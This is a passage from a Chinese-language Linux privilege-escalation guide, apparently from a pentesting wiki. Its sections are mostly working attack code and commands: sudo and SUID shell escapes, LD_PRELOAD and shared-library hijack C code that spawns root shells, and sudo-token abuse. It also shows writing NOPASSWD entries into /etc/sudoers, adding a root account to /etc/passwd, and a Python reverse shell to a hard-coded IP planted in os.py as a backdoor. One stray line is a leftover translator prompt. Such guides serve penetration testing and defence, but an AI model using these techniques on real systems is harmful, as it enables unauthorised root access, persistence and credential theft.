#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受一个漏洞影响，该漏洞允许具有 **UID > INT_MAX** 的用户提升权限。更多信息: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**利用它** 使用: **`systemd-run -t /bin/bash`**

### Groups

检查你是否属于可能授予你 root 权限的**某个组**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

如果你 **知道环境中的任意密码**，请 **尝试使用该密码登录每个用户**。

### Su Brute

如果你不介意产生大量噪音，并且目标机器上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行暴力破解。

## 可写的 PATH 滥用

### $PATH

如果你发现自己可以在 $PATH 的某个文件夹中 **写入**，你可能能够通过 **在该可写文件夹中创建后门** 来提升权限，后门文件名使用某个会被另一个用户（最好是 root）执行的命令名，且该命令 **不会从位于你可写文件夹之前的路径中加载**。

### SUDO and SUID

你可能被允许使用 sudo 来执行某些命令，或者它们可能设置了 suid 位。使用以下方式检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些 **意想不到的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 的配置可能允许用户在不知晓密码的情况下以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh key 添加到 root 目录或调用 `sh` 就可以轻松获得 shell。
```
sudo vim -c '!sh'
```
### SETENV

这个指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个示例，**based on HTB machine Admirer**，**存在漏洞**，可通过 **PYTHONPATH hijacking** 在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

如果 sudoers 保留了 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互启动行为，在调用被允许的命令时以 root 身份运行任意代码。

- Why it works: 对于非交互式 shells，Bash 会评估 `$BASH_ENV` 并在运行目标脚本之前 source 该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 `BASH_ENV` 被 sudo 保留，你的文件会以 root 权限被 source。

- Requirements:
- 你可以运行的 sudo 规则（任何以非交互方式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 出现在 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固：
- 移除 `BASH_ENV`（和 `ENV`）从 `env_keep`，优先使用 `env_reset`。
- 避免为 sudo-allowed commands 使用 shell wrappers；使用最小的二进制文件。
- 考虑在保留的 env vars 被使用时启用 sudo I/O logging 和告警。

### 绕过 Sudo 执行的路径

**跳转** 去读取其他文件或使用 **symlinks**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*)，就更容易：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**对策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary 未指定命令路径

如果将 **sudo permission** 授予单个命令 **未指定路径**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
这个技巧也可以在 **suid** 二进制文件 **在不指定命令路径的情况下执行另一个命令时使用（始终用** _**strings**_ **检查可疑 SUID 二进制文件的内容））。**

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary 带有命令路径

如果 **suid** 二进制文件 **执行另一个命令并指定了路径**，那么你可以尝试 **导出一个函数**，其名称与 suid 文件调用的命令相同。

例如，如果一个 suid 二进制文件调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并导出它：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用该 suid 二进制文件时，这个函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

然而，为了维护系统安全并防止该功能被滥用，特别是在 **suid/sgid** 可执行文件的情况下，系统强制执行某些限制：

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后 **编译它** 使用：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**escalate privileges** 运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果 attacker 控制了 **LD_LIBRARY_PATH** env variable，就可以滥用类似的 privesc，因为 attacker 控制着库将被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且看起来不寻常的二进制文件时，最好验证它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到像 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，表明存在被利用的可能性。

要利用这一点，可以创建一个 C 文件，比如 _"/path/to/.config/libcalc.c"_，包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
此代码在编译并执行后，旨在通过修改文件权限并执行一个 shell 来 elevate privileges。

使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID 二进制文件应触发 exploit，从而可能导致系统妥协。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经找到一个从我们可以写入的文件夹加载库的 SUID 二进制文件，接下来在该文件夹中用必要的名称创建该库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要包含一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个整理好的 Unix binaries 列表，攻击者可以利用这些 binaries 绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 是类似的项目，但适用于你**只能注入参数**的情况。

该项目收集了 Unix binaries 的合法功能，这些功能可能被滥用以突破 restricted shells、escalate 或维持 elevated privileges、传输文件、生成 bind 和 reverse shells，并促进其它 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你能访问 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 检查它是否能找到利用某些 sudo 规则的方法。

### Reusing Sudo Tokens

在你有 **sudo access** 但不知道密码的情况下，你可以通过**等待 sudo command execution 然后劫持会话 token**来提升权限。

Requirements to escalate privileges:

- 你已经以用户 "_sampleuser_" 拥有一个 shell
- "_sampleuser_" 已**使用过 `sudo`** 在**过去 15mins**内执行过某些操作（默认这是 sudo token 的持续时间，允许在此期间使用 `sudo` 而不需要输入密码）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
- `gdb` 可用（你可以上传它）

(你可以临时通过 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 启用 `ptrace_scope`，或通过修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来永久修改)

如果满足所有这些要求，**你可以使用：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) 来提升权限。

- 第一个 exploit (`exploit.sh`) 会在 _/tmp_ 创建二进制文件 `activate_sudo_token`。你可以用它来**激活你会话中的 sudo token**（它不会自动给你 root shell，需执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 该 **第二个 exploit** (`exploit_v2.sh`) 会在 _/tmp_ 中创建一个 sh shell，**由 root 拥有并带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 该 **第三个 exploit** (`exploit_v3.sh`) 将 **创建一个 sudoers file**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/<Username>

如果你对该文件夹或文件夹内任意已创建文件拥有 **写权限**，你可以使用二进制 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来 **为某个 user 和 PID 创建一个 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且你以该 user 的身份拥有 PID 为 1234 的 shell，你可以在不需要知道密码的情况下通过如下操作 **obtain sudo privileges**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` 文件和 `/etc/sudoers.d` 中的文件用于配置谁可以使用 `sudo` 以及如何使用。 这些文件 **默认情况下只能由用户 root 和组 root 读取**.\
**如果** 你可以 **读取** 这个文件，你可能能够 **获得一些有用的信息**，如果你可以 **写入** 任何文件，你将能够 **escalate privileges**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你可以写入，你就可以滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些可替代 `sudo` 二进制的工具，例如 OpenBSD 上的 `doas`，记得检查其配置文件 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道一个**用户通常连接到一台机器并使用 `sudo`** 来提升权限，并且你在该用户上下文中取得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，它会以 root 身份先执行你的代码然后再执行该用户的命令。然后，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会执行你创建的 sudo 可执行文件。

注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件来添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改了 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示了**加载的配置文件来自哪里**。通常，该文件包含如下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。 这些配置文件**指向其他目录**，系统将在这些目录中**搜索**库文件。 例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库文件**。

如果某个用户在任一列出的路径上**拥有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任意文件，或 `/etc/ld.so.conf.d/*.conf` 指向的任意目录，他可能能够提权。\
请查看以下页面，了解**如何利用此配置错误**：


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
将 lib 复制到 `/var/tmp/flag15/` 后，程序会在此位置使用它，正如 `RPATH` 变量所指定的。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities 提供了一个进程可用 root privileges 的 **子集**。这实际上将 root **privileges 拆分为更小且独立的单元**。这些单元可以独立地授予给进程。通过这种方式，完整的权限集合被缩小，从而降低被利用的风险。\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**给** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACL 的文件:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell sessions

在 **旧版本** 中，你可能可以 **hijack** 某个不同用户的 **shell** session（**root**）。\
在 **最新版本** 中，你只能 **connect** 到 **你自己的 user** 的 screen sessions。不过，你仍可能在 session 内发现 **有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是 **旧的 tmux 版本** 的问题。我作为非特权用户无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受此漏洞影响。\
这个漏洞在那些 OS 上创建新的 ssh key 时产生，因为 **只有 32,768 种变体是可能的**。这意味着所有可能性都可以被计算出来，并且 **拥有 ssh public key 就可以搜索对应的 private key**。你可以在这里找到计算出的可能性: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 指定是否允许密码认证。默认值为 `no`。
- **PubkeyAuthentication:** 指定是否允许公钥认证。默认值为 `yes`。
- **PermitEmptyPasswords**: 当允许密码认证时，指定服务器是否允许使用空密码字符串的账户登录。默认值为 `no`。

### PermitRootLogin

指定 root 是否可以使用 ssh 登录，默认值为 `no`。可选值：

- `yes`: root 可以使用密码和 private key 登录
- `without-password` or `prohibit-password`: root 只能使用 private key 登录
- `forced-commands-only`: root 仅能使用 private key 登录，且必须指定 commands 选项
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的 public keys 的文件。它可以包含像 `%h` 这样的 tokens，%h 会被替换为 home 目录。**你可以指示绝对路径**（以 `/` 开头）或 **相对于用户 home 的相对路径**。例如:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys** (without passphrases!) 存放在你的服务器上。因此，你可以通过 ssh **jump** 到一台主机，然后从那里 **jump to another** 主机，**using** 位于你 **initial host** 的 **key**。

你需要在 `$HOME/.ssh.config` 中设置此选项，如下：
```
Host example.com
ForwardAgent yes
```
请注意，如果 `Host` 是 `*`，用户每次跳到不同的机器时，该主机都可以访问密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 此 **选项** 并允许或拒绝此配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent forwarding（默认是允许）。

如果你发现环境中配置了 Forward Agent，请阅读下面的页面，**因为你可能能够滥用它来提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profiles 文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是 **在用户运行新 shell 时执行的脚本**。因此，如果你能 **写入或修改其中任何一个文件，你就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何异常的 profile 脚本，你应该检查其中是否包含 **敏感信息**。

### Passwd/Shadow 文件

根据操作系统，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称或存在备份。因此建议 **查找所有这些文件** 并 **检查是否可以读取** 它们，以确认文件中 **是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效文件）中找到 **password hashes**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下任一命令生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
请提供文件 src/linux-hardening/privilege-escalation/README.md 的内容或粘贴需要翻译的部分，然后我会在适当位置添加用户 `hacker` 和生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令，用户名/密码为 `hacker:hacker`

或者，你可以使用下面的几行来添加一个不带密码的虚拟用户。\
警告：这可能会降低当前机器的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，另外 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入某些敏感文件**。例如，你能否写入某些**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器并且你可以 **修改位于 /etc/systemd/ 的 Tomcat 服务配置文件,** 那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的后门将在下次启动 tomcat 时被执行。

### 检查目录

以下目录可能包含备份或有趣的信息: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (最后一个你可能无法读取，但试着访问)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含密码的文件

查看 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **多个可能包含密码的文件**。\
**另一个有趣的工具** 是： [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux & Mac。

### 日志

如果你能读取日志，你可能会在其中发现 **有趣/机密的信息**。日志越奇怪，可能越有价值（大概）。\
此外，某些“**配置不当**”（或被后门化？）的 **audit logs** 可能允许你**在其中记录密码**，正如这篇文章所述： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了 **读取日志的组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 将非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名中或文件**内容**内包含单词 "**password**" 的文件，也要检查日志中的 IPs 和 emails，或 hashes 的 regexps。\
我不会在这里列出如何完成所有这些操作，但如果你感兴趣可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道一个 python 脚本将从 **哪里** 被执行，并且你 **可以在该文件夹写入**，或者你可以 **modify python libraries**，你可以修改 OS 库并对其 backdoor（如果你能写入 python 脚本将被执行的位置，复制并粘贴 os.py 库）。

要 **backdoor the library**，只需在 os.py 库的末尾添加以下行（change IP and PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

在 `logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户可能获得提权。原因是 `logrotate` 通常以 **root** 身份运行，可以被操控以执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅要检查 _/var/log_ 的权限，还要检查任何应用了日志轮转的目录。

> [!TIP]
> 此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

